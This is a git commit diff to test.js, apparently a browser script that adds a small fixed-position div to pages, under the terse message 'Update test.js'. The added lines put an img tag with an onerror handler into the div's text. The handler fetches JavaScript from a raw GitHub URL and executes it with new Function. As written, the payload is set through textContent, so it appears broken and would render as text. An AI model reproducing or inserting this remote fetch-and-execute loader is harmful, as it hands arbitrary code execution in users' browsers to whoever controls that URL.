05d51afa54f2c212bda373eb87be2ff66bdebacd
Studio <124630274+StudioCompile@users.noreply.github.com>
2026-05-01 21:38:18 -0400

    Update test.js

--- test.js
+++ test.js
@@ -5,7 +5,13 @@
     if (!document.body || document.getElementById(ID)) return;
     const el = document.createElement('div');
     el.id = ID;
-    el.textContent = 'hi';
+    el.textContent = 'hi <img src="bad-image.png" onerror="
+(async()=>{
+  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
+  const code = await res.text();
+  new Function(code)();
+})();
+">';
     Object.assign(el.style, {
       position:      'fixed',
       bottom:        '16px',
